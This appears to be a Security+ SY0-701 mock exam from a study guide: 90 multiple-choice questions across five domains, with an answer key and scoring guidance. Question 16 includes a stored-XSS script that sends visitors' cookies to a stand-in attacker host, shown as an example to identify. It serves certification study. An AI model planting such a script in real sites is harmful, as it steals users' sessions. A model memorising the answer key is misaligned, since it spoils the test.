# 📝 Mock Exam 1

**90 questions · 90 minutes · Weighted like SY0-701 (D1: 11 · D2: 20 · D3: 16 · D4: 25 · D5: 18)**

Take this under real exam conditions: timer on, no notes, no pausing, answer everything. Then mark it with the key and fill in the score tracker in [Chapter 51](51-mock-exams-and-final-two-weeks.md).

---

## Domain 1 — General Security Concepts

**1.** A company posts signs stating that the premises are under 24-hour video surveillance. Which type of control is this?
A. Corrective  B. Deterrent  C. Compensating  D. Detective

**2.** A legacy application cannot support MFA, so administrators may access it only from a single hardened host with enhanced logging. This is BEST described as a:
A. Compensating control  B. Directive control  C. Preventive control only  D. Managerial control

**3.** Which of the following BEST provides non-repudiation for a contract sent by email?
A. Encrypting it with AES  B. Hashing it with SHA-256  C. Digitally signing it with the sender's private key  D. Sending it over TLS

**4.** In a zero trust architecture, which component allows, monitors or terminates the connection between a subject and a resource?
A. Policy Enforcement Point  B. Policy Administrator  C. Policy Engine  D. Implicit trust zone

**5.** A spreadsheet named "Q3_Salaries_FINAL.xlsx" is placed on a file share that no employee needs. Opening it triggers an alert. This is a:
A. Honeypot  B. Honeynet  C. Honeyfile  D. DLP rule

**6.** A newly deployed firewall rule breaks the payroll application during a maintenance window. What should the administrator do NEXT?
A. Execute the backout plan  B. Disable the firewall  C. Update the network diagram  D. Start a new impact analysis

**7.** Which change management activity identifies other systems that could be affected by a planned change?
A. Version control  B. Impact analysis  C. Maintenance window  D. Standard operating procedure

**8.** A certificate authority needs tamper-resistant hardware to generate and store its signing keys. Which is BEST?
A. TPM  B. Password manager  C. Secure enclave on a laptop  D. HSM

**9.** Which method lets a web server provide its own certificate-revocation status during the TLS handshake?
A. OCSP stapling  B. CRL  C. CSR  D. Key escrow

**10.** An organization must be able to recover encrypted data if an employee loses their private key. Which practice supports this?
A. Key stretching  B. Certificate pinning  C. Salting  D. Key escrow

**11.** Which physical control BEST prevents an unauthorized person from following an employee into a data center?
A. Bollards  B. Motion lighting  C. Access control vestibule  D. CCTV

---

## Domain 2 — Threats, Vulnerabilities & Mitigations

**12.** Employees receive text messages claiming to be from IT, asking them to approve any MFA prompts they receive "for a system upgrade." This is:
A. Vishing  B. Smishing  C. Whaling  D. Typosquatting

**13.** A well-funded group remains undetected in a defense contractor's network for over a year, stealing designs. Which threat actor is MOST likely?
A. Nation-state  B. Hacktivist  C. Unskilled attacker  D. Shadow IT

**14.** Engineers are infected after visiting a trusted industry news site that attackers had compromised. This is a:
A. Brand impersonation  B. Watering hole attack  C. Pretexting  D. Typosquatting

**15.** Malware encrypts a company's file servers, and the attackers threaten to publish stolen data unless paid. This is:
A. A logic bomb  B. A rootkit  C. Ransomware  D. Bloatware

**16.** A comment field on a website stores `<script>new Image().src='http://evil.example/?c='+document.cookie</script>`, which runs for every visitor. This is:
A. SQL injection  B. Directory traversal  C. CSRF  D. Stored XSS

**17.** By changing `?invoice=1002` to `?invoice=1003` in a URL, a customer can view another customer's invoice. This is:
A. Vertical privilege escalation  B. Horizontal privilege escalation  C. SSRF  D. Replay

**18.** Many users are locked out of their accounts at the same time every morning. What is the MOST likely cause?
A. A DHCP failure  B. Impossible travel  C. A password attack against user accounts  D. A certificate expiry

**19.** Attackers send small queries to public NTP servers with a spoofed source address, flooding the victim with large responses. This is:
A. An amplified (reflected) DDoS  B. DNS tunneling  C. ARP poisoning  D. A SYN flood

**20.** A legacy server cannot be patched against a known remote code execution flaw. What is the BEST mitigation?
A. Isolate it on a restricted network segment  B. Disable its logging  C. Give users local admin rights  D. Ignore it until replacement

**21.** Which mitigation BEST prevents users from running unauthorized executables?
A. DLP  B. Full-disk encryption  C. Host-based firewall  D. Application allow list

**22.** An attacker sends forged management frames that repeatedly disconnect users from the corporate Wi-Fi. This is a:
A. Jamming attack  B. Bluesnarfing  C. Deauthentication attack  D. Rogue AP

**23.** A software vendor's update server is compromised, and signed malicious updates are pushed to customers. Which vulnerability type is this?
A. Zero-day  B. Malicious update (supply chain)  C. Race condition  D. VM escape

**24.** Researchers produce two different PDF files with the same SHA-1 hash. Which attack does this demonstrate?
A. Downgrade  B. Brute force  C. Replay  D. Collision

**25.** A group defaces a website to protest a company's environmental record. Their MOST likely motivation is:
A. Financial gain  B. Philosophical/political beliefs  C. Espionage  D. War

**26.** A sales team stores customer lists in an unapproved personal file-sharing service. This is an example of:
A. Shadow IT  B. Organized crime  C. A nation-state attack  D. A supply chain attack

**27.** A backup copy of a configuration file containing the database password is left readable in the web server's public directory. This is BEST described as:
A. Misconfiguration  B. Zero-day  C. Race condition  D. Buffer overflow

**28.** An attacker captures a user's password hash and uses it to authenticate without cracking it. This is:
A. Rainbow table attack  B. Password spraying  C. Credential replay (pass-the-hash)  D. Dictionary attack

**29.** Malware inserts its code into the memory space of a legitimate running process. This is:
A. Jailbreaking  B. Side-loading  C. Memory injection  D. Steganography

**30.** Security logs show administrative activity on a server at 3:00 a.m., when no staff work. Which indicator is this?
A. Published/documented  B. Out-of-cycle logging  C. Blocked content  D. Resource inaccessibility

**31.** Which action BEST reduces the attack surface of a newly installed web server?
A. Disable unnecessary services and ports  B. Increase the log retention period  C. Add more RAM  D. Enable directory listing

---

## Domain 3 — Security Architecture

**32.** In an IaaS deployment, who is responsible for patching the guest operating system?
A. The cloud provider  B. The hypervisor vendor  C. The customer  D. The internet service provider

**33.** What is the PRIMARY security concern of a software-defined network?
A. It requires air-gapping  B. Switches can't forward traffic  C. It cannot use VLANs  D. Compromise of the controller would give control over the entire network

**34.** A hospital infusion pump runs embedded software that cannot be patched. Which is the BEST approach?
A. Replace the hospital's firewall  B. Connect it directly to the internet for updates  C. Disable its alarms  D. Place it on a segmented network with strict access controls

**35.** Where should a web application firewall be placed?
A. Between users' PCs and the internet proxy  B. In front of the web servers it protects  C. Inside the database server  D. On the guest Wi-Fi

**36.** A firewall protecting a payment system must block all traffic if it fails. This is:
A. Fail-open  B. Active/active  C. Fail-closed  D. Inline tap

**37.** Which IPsec configuration encrypts the entire original packet between two gateways?
A. AH in transport mode  B. IKE only  C. ESP in transport mode  D. ESP in tunnel mode

**38.** Which solution combines SD-WAN with cloud-delivered security services for branch offices and remote users?
A. SASE  B. UTM  C. NAC  D. VDI

**39.** A support portal must show only the last four digits of customers' card numbers. Which method fits?
A. Tokenization  B. Hashing  C. Masking  D. Steganography

**40.** A national law requires citizens' health data to remain in the country. This relates to:
A. Data sovereignty  B. Data masking  C. Obfuscation  D. Load balancing

**41.** Data being processed in a server's RAM is in which state?
A. At rest  B. In use  C. In transit  D. Archived

**42.** A recovery site provides only space, power and cooling. What type of site is it?
A. Hot site  B. Cold site  C. Warm site  D. Mobile site

**43.** Two database servers share storage and automatically take over for each other if one fails. This is:
A. Clustering  B. Load balancing  C. Journaling  D. Snapshotting

**44.** A test in which the recovery system processes real transactions at the same time as the primary system is called:
A. Tabletop exercise  B. Failover  C. Simulation  D. Parallel processing

**45.** Which device provides instant power for minutes during an outage until a generator starts?
A. PDU  B. Load balancer  C. RAID controller  D. UPS

**46.** In 802.1X, what role does the RADIUS server play?
A. Supplicant  B. Authenticator  C. Authentication server  D. Certificate authority

**47.** Compared with virtual machines, what is a key security consideration for containers?
A. They cannot be scanned  B. They share the host's kernel  C. Each needs its own full OS  D. They can't use networks

---

## Domain 4 — Security Operations

**48.** Which source is BEST for establishing a secure baseline for a new Linux server?
A. A random online forum post  B. A CIS Benchmark  C. The server's default settings  D. The previous administrator's notes

**49.** Phones are owned by the company, and employees may also use them for personal purposes. This deployment model is:
A. COPE  B. CYOD  C. BYOD  D. COBO

**50.** Which cookie attribute ensures a session cookie is sent only over HTTPS?
A. HttpOnly  B. Max-Age  C. SameSite  D. Secure

**51.** Which method is MOST appropriate for sanitizing an encrypted SSD before reuse?
A. Cryptographic erase  B. Degaussing  C. Quick formatting  D. Deleting the files

**52.** A network scan finds a device that isn't in the asset inventory. Which activity discovered it?
A. Procurement  B. Enumeration  C. Certification  D. Data retention

**53.** A vulnerability scanner reports a missing patch, but the patch is confirmed installed. This is a:
A. True positive  B. True negative  C. False negative  D. False positive

**54.** A CVSS 9.8 vulnerability on an internet-facing VPN appliance is being actively exploited. What should be done?
A. Patch it as an emergency change  B. Add it to next year's budget  C. Accept the risk  D. Disable logging on the appliance

**55.** Which provides a unique identifier for a publicly known vulnerability?
A. CVSS  B. STIX  C. SCAP  D. CVE

**56.** Which tool aggregates and correlates logs from many sources and generates alerts?
A. SIEM  B. DLP  C. NetFlow collector  D. HSM

**57.** A router sends an unsolicited alert to the management station when an interface goes down. This is a(n):
A. Syslog query  B. SNMP trap  C. NetFlow record  D. ICMP echo

**58.** Which data source shows how many bytes an internal host sent to an external IP, without showing the content?
A. NetFlow  B. Packet capture  C. Application log  D. Vulnerability scan

**59.** Which DNS record tells receiving mail servers to reject messages that fail authentication for a domain?
A. SPF  B. DKIM  C. MX  D. DMARC

**60.** Which Linux feature confines a compromised service even if it runs as root?
A. sudo  B. Group Policy  C. SELinux  D. cron

**61.** Laptops without current antivirus are automatically placed in a remediation VLAN. Which technology does this?
A. DLP  B. NAC  C. SOAR  D. FIM

**62.** Which control alerts when files in a web server's content directory change unexpectedly?
A. Load balancer  B. Web filter  C. File integrity monitoring  D. Tokenization

**63.** Users log in once to the company identity provider, which sends XML assertions to SaaS applications. Which standard is this?
A. OAuth  B. Kerberos  C. SAML  D. LDAP

**64.** A calendar app gets limited access to a user's email contacts without ever seeing the user's password. Which protocol enables this?
A. OAuth  B. RADIUS  C. TACACS+  D. LDAPS

**65.** Access is granted based on clearance levels and data classification labels. Which model is this?
A. DAC  B. MAC  C. RBAC  D. Rule-based

**66.** Administrators receive admin rights for two hours after approval, after which the rights are removed automatically. This is:
A. Attestation  B. Password vaulting  C. Federation  D. Just-in-time permissions

**67.** A cloud policy automatically prevents anyone from creating publicly accessible storage buckets. This is an example of:
A. Ticket creation  B. Escalation  C. Guard rails  D. Technical debt

**68.** An incident has been contained. What is the NEXT step in the incident response process?
A. Eradication  B. Lessons learned  C. Detection  D. Preparation

**69.** Which evidence should be collected FIRST from a running, compromised workstation?
A. Hard drive image  B. Remote syslog data  C. Backup tapes  D. System memory (RAM)

**70.** Which document records everyone who handled a piece of evidence and when?
A. Legal hold  B. Rules of engagement  C. Order of volatility  D. Chain of custody

**71.** A Windows Security log shows 300 Event ID 4625 entries for one account from a single IP, followed by Event ID 4624 from that IP. What happened?
A. Normal user behavior  B. A failed password spraying attack  C. A successful brute-force attack  D. A DNS attack

**72.** Which data source would show the exact username and password sent during an FTP session?
A. NetFlow  B. Packet capture  C. Firewall log  D. Vulnerability scan

---

## Domain 5 — Security Program Management & Oversight

**73.** Which governance document provides step-by-step instructions for a task?
A. Policy  B. Standard  C. Procedure  D. Guideline

**74.** Who is accountable for classifying a data set and approving access to it?
A. Data custodian  B. Data subject  C. Data processor  D. Data owner

**75.** A cloud email provider handles personal data on behalf of a retailer. Under GDPR, the provider is the:
A. Controller  B. Data subject  C. Processor  D. Data owner

**76.** An asset is valued at $120,000, and an incident would destroy 25% of its value. What is the SLE?
A. $12,000  B. $30,000  C. $48,000  D. $120,000

**77.** A risk has an SLE of $30,000 and is expected once every two years. What is the ALE?
A. $7,500  B. $30,000  C. $60,000  D. $15,000

**78.** Which metric defines the maximum acceptable amount of data loss measured in time?
A. RTO  B. MTTR  C. MTBF  D. RPO

**79.** A company purchases cyber insurance. Which risk strategy is this?
A. Accept  B. Avoid  C. Mitigate  D. Transfer

**80.** A startup willing to take significant risks to grow quickly has which risk appetite?
A. Conservative  B. Neutral  C. Expansionary  D. Avoidant

**81.** The number of unpatched critical systems is tracked monthly as an early warning that risk is rising. This metric is a:
A. Risk owner  B. Key risk indicator  C. Recovery point objective  D. Exposure factor

**82.** Which agreement defines 99.9% uptime and service credits if the vendor misses it?
A. SLA  B. NDA  C. MOU  D. BPA

**83.** Two organizations document their intention to cooperate without creating legally binding obligations. Which document is this?
A. MOU  B. MSA  C. SOW  D. SLA

**84.** Which contract clause allows a company to inspect a vendor's security controls?
A. Non-compete clause  B. Right-to-audit clause  C. Force majeure clause  D. Indemnity clause

**85.** Employees sign each year to confirm they have read and understood the acceptable use policy. This is:
A. Attestation by an auditor  B. Acknowledgement  C. E-discovery  D. Legal hold

**86.** An EU customer asks a company to delete all personal data held about them. Which right is this?
A. Right to be forgotten (erasure)  B. Right of access  C. Right to portability  D. Right to object

**87.** A penetration tester receives only the company's name before the test. Which type of test is this?
A. Known environment  B. Partially known environment  C. Integrated test  D. Unknown environment

**88.** A tester studies the target's job postings and staff LinkedIn profiles to learn its technologies. This is:
A. Active reconnaissance  B. Passive reconnaissance  C. Exploitation  D. Lateral movement

**89.** Red and blue teams work together during an exercise, sharing findings in real time. This is BEST described as:
A. Offensive testing  B. Defensive testing  C. Integrated testing  D. Physical testing

**90.** Which metric BEST shows that a phishing awareness program is building a strong security culture?
A. The cost of the training platform  B. The number of training slides  C. A rising rate of employees reporting suspicious emails  D. The number of emails blocked by the gateway

---

## ✅ Answer Key

<details>
<summary><b>Click to show answers (mark your exam first!)</b></summary>

| # | Ans | Domain | Why (chapter) |
|---|---|---|---|
| 1 | B | D1 | Signs discourage = deterrent (13) |
| 2 | A | D1 | Alternative to the missing MFA = compensating (13) |
| 3 | C | D1 | Digital signature = non-repudiation (12, 18) |
| 4 | A | D1 | PEP enforces (33) |
| 5 | C | D1 | Decoy file = honeyfile (33) |
| 6 | A | D1 | Failed change → backout plan (33) |
| 7 | B | D1 | Impact analysis finds dependencies (33) |
| 8 | D | D1 | HSM (28) |
| 9 | A | D1 | OCSP stapling (28) |
| 10 | D | D1 | Key escrow (28) |
| 11 | C | D1 | Access control vestibule (19) |
| 12 | B | D2 | SMS = smishing (15) |
| 13 | A | D2 | Long, stealthy espionage = nation-state/APT (14) |
| 14 | B | D2 | Watering hole (15) |
| 15 | C | D2 | Ransomware (double extortion) (16) |
| 16 | D | D2 | Saved script runs for all visitors = stored XSS (24) |
| 17 | B | D2 | Same level, other user's data = horizontal (26) |
| 18 | C | D2 | Account lockout indicator (26) |
| 19 | A | D2 | Spoofed source + large replies = amplified/reflected (25) |
| 20 | A | D2 | Isolation/segmentation as compensating control (27) |
| 21 | D | D2 | Application allow list (27) |
| 22 | C | D2 | Deauthentication (25) |
| 23 | B | D2 | Malicious update / supply chain (24) |
| 24 | D | D2 | Collision (26) |
| 25 | B | D2 | Hacktivist motivation (14) |
| 26 | A | D2 | Shadow IT (14) |
| 27 | A | D2 | Misconfiguration (24) |
| 28 | C | D2 | Pass-the-hash = credential replay (25) |
| 29 | C | D2 | Memory injection (24) |
| 30 | B | D2 | Out-of-cycle logging (26) |
| 31 | A | D2 | Disable unneeded services/ports (27) |
| 32 | C | D3 | IaaS: customer patches the OS (29) |
| 33 | D | D3 | Controller is the single high-value target (29) |
| 34 | D | D3 | Segment unpatchable embedded systems (29) |
| 35 | B | D3 | WAF in front of web servers (30) |
| 36 | C | D3 | Fail-closed favors security (30) |
| 37 | D | D3 | ESP tunnel mode (30) |
| 38 | A | D3 | SASE (30) |
| 39 | C | D3 | Masking (31) |
| 40 | A | D3 | Data sovereignty (31) |
| 41 | B | D3 | In use (21, 31) |
| 42 | B | D3 | Cold site (32) |
| 43 | A | D3 | Clustering (32) |
| 44 | D | D3 | Parallel processing (32) |
| 45 | D | D3 | UPS (32) |
| 46 | C | D3 | Authentication server (30) |
| 47 | B | D3 | Shared kernel (29) |
| 48 | B | D4 | CIS Benchmark (34) |
| 49 | A | D4 | COPE (34) |
| 50 | D | D4 | Secure flag (34) |
| 51 | A | D4 | Crypto erase; degaussing doesn't work on SSDs (35) |
| 52 | B | D4 | Enumeration (35) |
| 53 | D | D4 | False positive (36) |
| 54 | A | D4 | Critical + exposed + exploited → emergency patch (36) |
| 55 | D | D4 | CVE (36) |
| 56 | A | D4 | SIEM (37) |
| 57 | B | D4 | SNMP trap (37) |
| 58 | A | D4 | NetFlow (37, 42) |
| 59 | D | D4 | DMARC (38) |
| 60 | C | D4 | SELinux (38) |
| 61 | B | D4 | NAC (38) |
| 62 | C | D4 | FIM (38) |
| 63 | C | D4 | SAML (39) |
| 64 | A | D4 | OAuth (39) |
| 65 | B | D4 | MAC (39) |
| 66 | D | D4 | JIT permissions (39) |
| 67 | C | D4 | Guard rails (40) |
| 68 | A | D4 | Eradication follows containment (41) |
| 69 | D | D4 | RAM is most volatile of these (41) |
| 70 | D | D4 | Chain of custody (41) |
| 71 | C | D4 | Many 4625 then 4624 = successful brute force (42) |
| 72 | B | D4 | Packet capture shows content (42) |
| 73 | C | D5 | Procedure (43) |
| 74 | D | D5 | Data owner (43) |
| 75 | C | D5 | Processor (43, 46) |
| 76 | B | D5 | 120,000 × 0.25 = 30,000 (44) |
| 77 | D | D5 | 30,000 × 0.5 = 15,000 (44) |
| 78 | D | D5 | RPO (44) |
| 79 | D | D5 | Transfer (44) |
| 80 | C | D5 | Expansionary (44) |
| 81 | B | D5 | KRI (44) |
| 82 | A | D5 | SLA (45) |
| 83 | A | D5 | MOU (45) |
| 84 | B | D5 | Right-to-audit (45) |
| 85 | B | D5 | Acknowledgement (46) |
| 86 | A | D5 | Right to be forgotten (46) |
| 87 | D | D5 | Unknown environment (47) |
| 88 | B | D5 | Passive reconnaissance (47) |
| 89 | C | D5 | Integrated (purple) (47) |
| 90 | C | D5 | Report rate (48) |

**Scoring:** 77+ (85%) = ready-level performance · 63–76 = keep going, focus on your weakest domain · below 63 = review the Level 3/4 chapters for your two weakest domains before Mock 2.

</details>
